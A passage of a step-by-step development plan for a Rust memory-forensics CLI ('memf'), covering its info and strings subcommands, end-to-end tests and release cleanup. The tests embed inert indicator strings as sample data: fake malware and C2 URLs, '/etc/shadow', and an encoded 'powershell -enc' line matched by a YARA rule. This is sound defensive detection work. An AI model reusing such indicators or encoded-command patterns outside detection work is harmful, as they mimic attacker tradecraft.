```bash
cd ~/src/memory-forensic
git add crates/memf-strings/src/yara_classifier.rs
git commit -m "feat(memf-strings): YARA-X classifier with rule compilation and scanning"
```

---

### Task 12: memf CLI — Info Subcommand

**Files:**
- Modify: `~/src/memory-forensic/src/main.rs`

- [ ] **Step 1: Write the CLI with info subcommand**

```rust
// ~/src/memory-forensic/src/main.rs
#![deny(unsafe_code)]

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use comfy_table::{Table, presets::UTF8_FULL_CONDENSED};
use std::path::PathBuf;

#[derive(Parser)]
#[command(name = "memf", about = "Memory forensics toolkit", version)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Show dump format, physical ranges, and basic metadata.
    Info {
        /// Path to the memory dump file.
        dump: PathBuf,
    },
    /// Extract and classify strings from a memory dump or strings file.
    Strings {
        /// Path to the memory dump file (mutually exclusive with --from-file).
        dump: Option<PathBuf>,

        /// Load pre-extracted strings from a file instead of a dump.
        #[arg(long)]
        from_file: Option<PathBuf>,

        /// Minimum string length (default: 4).
        #[arg(long, default_value = "4")]
        min_length: usize,

        /// Output format: table, json, csv.
        #[arg(long, default_value = "table")]
        output: OutputFormat,

        /// Path to YARA rules directory.
        #[arg(long)]
        rules: Option<PathBuf>,
    },
}

#[derive(Clone, clap::ValueEnum)]
enum OutputFormat {
    Table,
    Json,
    Csv,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Info { dump } => cmd_info(&dump),
        Commands::Strings {
            dump,
            from_file,
            min_length,
            output,
            rules,
        } => cmd_strings(dump, from_file, min_length, output, rules),
    }
}

fn cmd_info(dump: &PathBuf) -> Result<()> {
    let provider = memf_format::open_dump(dump)
        .with_context(|| format!("failed to open {}", dump.display()))?;

    println!("Format:     {}", provider.format_name());
    println!("Total size: {} bytes ({:.2} GB)", provider.total_size(),
             provider.total_size() as f64 / (1024.0 * 1024.0 * 1024.0));
    println!("Ranges:     {}", provider.ranges().len());
    println!();

    let mut table = Table::new();
    table.load_preset(UTF8_FULL_CONDENSED);
    table.set_header(vec!["#", "Start", "End", "Size"]);

    for (i, range) in provider.ranges().iter().enumerate() {
        table.add_row(vec![
            format!("{i}"),
            format!("{:#014x}", range.start),
            format!("{:#014x}", range.end),
            format_size(range.len()),
        ]);
    }
    println!("{table}");

    Ok(())
}

fn cmd_strings(
    dump: Option<PathBuf>,
    from_file: Option<PathBuf>,
    min_length: usize,
    output: OutputFormat,
    rules: Option<PathBuf>,
) -> Result<()> {
    // Load strings from either a dump or a pre-extracted file
    let mut strings = if let Some(path) = from_file {
        memf_strings::from_file::from_strings_file(&path)
            .with_context(|| format!("failed to read strings file {}", path.display()))?
    } else if let Some(dump_path) = dump {
        let provider = memf_format::open_dump(&dump_path)
            .with_context(|| format!("failed to open {}", dump_path.display()))?;
        let config = memf_strings::extract::ExtractConfig {
            min_length,
            ascii: true,
            utf16le: true,
        };
        memf_strings::extract::extract_strings(provider.as_ref(), &config)
    } else {
        anyhow::bail!("provide either a dump file or --from-file");
    };

    // Classify with regex (always active via inventory)
    memf_strings::classify::classify_strings(&mut strings);

    // Optionally classify with YARA
    if let Some(rules_dir) = rules {
        let yara = memf_strings::yara_classifier::YaraClassifier::from_rules_dir(&rules_dir)
            .with_context(|| format!("failed to load YARA rules from {}", rules_dir.display()))?;
        for s in &mut strings {
            let matches = yara.scan_string(&s.value);
            s.categories.extend(matches);
        }
    }

    // Output
    match output {
        OutputFormat::Table => print_strings_table(&strings),
        OutputFormat::Json => print_strings_json(&strings)?,
        OutputFormat::Csv => print_strings_csv(&strings),
    }

    Ok(())
}

fn print_strings_table(strings: &[memf_strings::ClassifiedString]) {
    let mut table = Table::new();
    table.load_preset(UTF8_FULL_CONDENSED);
    table.set_header(vec!["Offset", "Encoding", "Categories", "Value"]);

    for s in strings {
        let cats: Vec<String> = s.categories.iter().map(|(c, conf)| {
            format!("{c:?}({conf:.0}%)", conf = conf * 100.0)
        }).collect();
        let cats_str = if cats.is_empty() { "-".to_string() } else { cats.join(", ") };

        let value_display = if s.value.len() > 80 {
            format!("{}...", &s.value[..77])
        } else {
            s.value.clone()
        };

        table.add_row(vec![
            format!("{:#010x}", s.physical_offset),
            format!("{:?}", s.encoding),
            cats_str,
            value_display,
        ]);
    }

    println!("{table}");
    println!("\nTotal: {} strings ({} classified)",
             strings.len(),
             strings.iter().filter(|s| !s.categories.is_empty()).count());
}

fn print_strings_json(strings: &[memf_strings::ClassifiedString]) -> Result<()> {
    for s in strings {
        let json = serde_json::json!({
            "offset": s.physical_offset,
            "encoding": format!("{:?}", s.encoding),
            "value": s.value,
            "categories": s.categories.iter().map(|(c, conf)| {
                serde_json::json!({"category": format!("{c:?}"), "confidence": conf})
            }).collect::<Vec<_>>(),
        });
        println!("{}", serde_json::to_string(&json)?);
    }
    Ok(())
}

fn print_strings_csv(strings: &[memf_strings::ClassifiedString]) {
    println!("offset,encoding,categories,value");
    for s in strings {
        let cats: Vec<String> = s.categories.iter().map(|(c, _)| format!("{c:?}")).collect();
        let escaped_value = s.value.replace('"', "\"\"");
        println!("{:#010x},{:?},{},\"{}\"",
                 s.physical_offset, s.encoding, cats.join(";"), escaped_value);
    }
}

fn format_size(bytes: u64) -> String {
    if bytes >= 1024 * 1024 * 1024 {
        format!("{:.2} GB", bytes as f64 / (1024.0 * 1024.0 * 1024.0))
    } else if bytes >= 1024 * 1024 {
        format!("{:.2} MB", bytes as f64 / (1024.0 * 1024.0))
    } else if bytes >= 1024 {
        format!("{:.2} KB", bytes as f64 / 1024.0)
    } else {
        format!("{bytes} B")
    }
}
```

- [ ] **Step 2: Verify build**

Run: `cargo build`
Expected: Compiles with 0 errors

- [ ] **Step 3: Test info command with synthetic dump**

```bash
cd ~/src/memory-forensic
# Create a small test LiME dump
cargo test -p memf-format -- --ignored 2>/dev/null || true
# Run the CLI
cargo run -- info /tmp/memf_test_lime 2>/dev/null || echo "OK: temp file from earlier test"
```

- [ ] **Step 4: Commit**

```bash
cd ~/src/memory-forensic
git add src/main.rs
git commit -m "feat(cli): info and strings subcommands with table/json/csv output"
```

---

### Task 13: Integration — End-to-End Smoke Test

**Files:**
- Create: `~/src/memory-forensic/tests/integration.rs`

- [ ] **Step 1: Write end-to-end integration tests**

```rust
// ~/src/memory-forensic/tests/integration.rs
//! End-to-end integration tests for the memf pipeline.

use memf_format::test_builders::{AvmlBuilder, LimeBuilder};
use memf_strings::extract::{ExtractConfig, extract_strings};
use memf_strings::classify::classify_strings;
use memf_strings::StringCategory;

#[test]
fn lime_extract_and_classify_url() {
    // Embed a URL in a LiME dump
    let mut data = vec![0u8; 256];
    let url = b"https://malware.example.com/shell.elf";
    data[32..32 + url.len()].copy_from_slice(url);

    let dump = LimeBuilder::new().add_range(0x1000, &data).build();
    let provider = memf_format::lime::LimeProvider::from_bytes(&dump).unwrap();

    let config = ExtractConfig {
        min_length: 4,
        ascii: true,
        utf16le: false,
    };
    let mut strings = extract_strings(&provider, &config);
    classify_strings(&mut strings);

    let url_matches: Vec<_> = strings
        .iter()
        .filter(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::Url))
        .collect();
    assert_eq!(url_matches.len(), 1);
    assert!(url_matches[0].value.contains("malware.example.com"));
}

#[test]
fn avml_extract_and_classify_ip() {
    let mut data = vec![0u8; 256];
    let ip = b"192.168.1.100";
    data[64..64 + ip.len()].copy_from_slice(ip);

    let dump = AvmlBuilder::new().add_range(0x2000, &data).build();
    let provider = memf_format::avml::AvmlProvider::from_bytes(&dump).unwrap();

    let mut strings = extract_strings(&provider, &ExtractConfig::default());
    classify_strings(&mut strings);

    let ip_matches: Vec<_> = strings
        .iter()
        .filter(|s| s.categories.iter().any(|(c, _)| *c == StringCategory::IpV4))
        .collect();
    assert!(!ip_matches.is_empty());
}

#[test]
fn from_file_and_classify() {
    use std::io::Write;

    let path = std::env::temp_dir().join("memf_integration_strings");
    {
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(f, "https://c2.evil.org/beacon").unwrap();
        writeln!(f, "192.168.0.1").unwrap();
        writeln!(f, "user@example.com").unwrap();
        writeln!(f, "random garbage text").unwrap();
        writeln!(f, "/etc/shadow").unwrap();
    }

    let mut strings = memf_strings::from_file::from_strings_file(&path).unwrap();
    classify_strings(&mut strings);

    // Count classified strings
    let classified: Vec<_> = strings.iter().filter(|s| !s.categories.is_empty()).collect();
    assert!(classified.len() >= 4, "expected >= 4 classified, got {}", classified.len());

    std::fs::remove_file(&path).ok();
}

#[test]
fn yara_classifier_with_custom_rule() {
    let rule = r#"
rule suspicious_powershell {
    strings:
        $ps = "powershell" nocase
    condition:
        $ps
}
"#;
    let classifier = memf_strings::yara_classifier::YaraClassifier::from_source(rule).unwrap();
    let matches = classifier.scan_string("powershell -enc ZWNobyBoZWxsbw==");
    assert_eq!(matches.len(), 1);
    assert!(matches!(matches[0].0, StringCategory::YaraMatch(ref name) if name == "suspicious_powershell"));
}
```

- [ ] **Step 2: Run integration tests**

Run: `cargo test --test integration`
Expected: 4 tests pass

- [ ] **Step 3: Run full test suite**

Run: `cargo test`
Expected: All tests pass (~30 total)

- [ ] **Step 4: Run clippy and fmt**

```bash
cd ~/src/memory-forensic
cargo fmt --all
cargo clippy --all-targets
```

Expected: No errors. Fix any warnings.

- [ ] **Step 5: Commit**

```bash
cd ~/src/memory-forensic
git add tests/integration.rs
git commit -m "test: end-to-end integration tests for LiME/AVML/from-file pipelines"
```

---

### Task 14: Real Data Integration Tests (Ignored)

**Files:**
- Create: `~/src/memory-forensic/tests/real_data.rs`

- [ ] **Step 1: Write ignored tests for real dump data**

```rust
// ~/src/memory-forensic/tests/real_data.rs
//! Integration tests using real memory dumps.
//!
//! These tests require the `MEMF_TEST_DATA` environment variable
//! to point to a directory containing test dumps. They are `#[ignore]`d
//! by default and run with:
//!
//! ```bash
//! MEMF_TEST_DATA=/path/to/dumps cargo test --test real_data -- --ignored
//! ```

use std::path::PathBuf;

fn test_data_dir() -> Option<PathBuf> {
    std::env::var("MEMF_TEST_DATA").ok().map(PathBuf::from)
}

#[test]
#[ignore = "requires real dump: set MEMF_TEST_DATA"]
fn avml_lime_real_dump() {
    let dir = test_data_dir().expect("MEMF_TEST_DATA not set");
    let dump = dir.join("avml.lime");
    if !dump.exists() {
        eprintln!("Skipping: {} not found", dump.display());
        return;
    }

    let provider = memf_format::open_dump(&dump).unwrap();
    assert_eq!(provider.format_name(), "LiME");
    assert!(provider.total_size() > 1_000_000_000, "expected > 1GB");
    println!("Opened {} ranges, {} total bytes",
             provider.ranges().len(), provider.total_size());
}

#[test]
#[ignore = "requires real strings file: set MEMF_TEST_DATA"]
fn classify_real_strings_file() {
    let dir = test_data_dir().expect("MEMF_TEST_DATA not set");
    let strings_file = dir.join("memory-strings.ascii");
    if !strings_file.exists() {
        eprintln!("Skipping: {} not found", strings_file.display());
        return;
    }

    let mut strings = memf_strings::from_file::from_strings_file(&strings_file).unwrap();
    println!("Loaded {} strings", strings.len());

    memf_strings::classify::classify_strings(&mut strings);
    let classified = strings.iter().filter(|s| !s.categories.is_empty()).count();
    println!("Classified {} of {} strings ({:.1}%)",
             classified, strings.len(),
             (classified as f64 / strings.len() as f64) * 100.0);

    assert!(classified > 0, "expected at least some strings to be classified");
}
```

- [ ] **Step 2: Verify tests compile (but skip)**

Run: `cargo test --test real_data`
Expected: 0 tests run (all ignored)

- [ ] **Step 3: Commit**

```bash
cd ~/src/memory-forensic
git add tests/real_data.rs
git commit -m "test: ignored real-data integration tests for AVML dumps and strings files"
```

---

### Task 15: Final Verification and Cleanup

**Files:**
- Modify: various (fmt/clippy fixes only)

- [ ] **Step 1: Run full test suite**

```bash
cd ~/src/memory-forensic
cargo test
```

Expected: All tests pass

- [ ] **Step 2: Run clippy with pedantic**

```bash
cd ~/src/memory-forensic
cargo clippy --all-targets -- -W clippy::pedantic
```

Expected: No errors. Fix any warnings that appear.

- [ ] **Step 3: Run fmt**

```bash
cd ~/src/memory-forensic
cargo fmt --all --check
```

Expected: No formatting issues

- [ ] **Step 4: Verify CLI help**

```bash
cd ~/src/memory-forensic
cargo run -- --help
cargo run -- info --help
cargo run -- strings --help
```

Expected: Help text displays correctly

- [ ] **Step 5: Commit any cleanup fixes**

```bash
cd ~/src/memory-forensic
git add -A
git commit -m "chore: fmt and clippy cleanup for Phase 1 completion"
```

- [ ] **Step 6: Tag the release**

```bash
cd ~/src/memory-forensic
git log --oneline
git tag v0.1.0-alpha
```
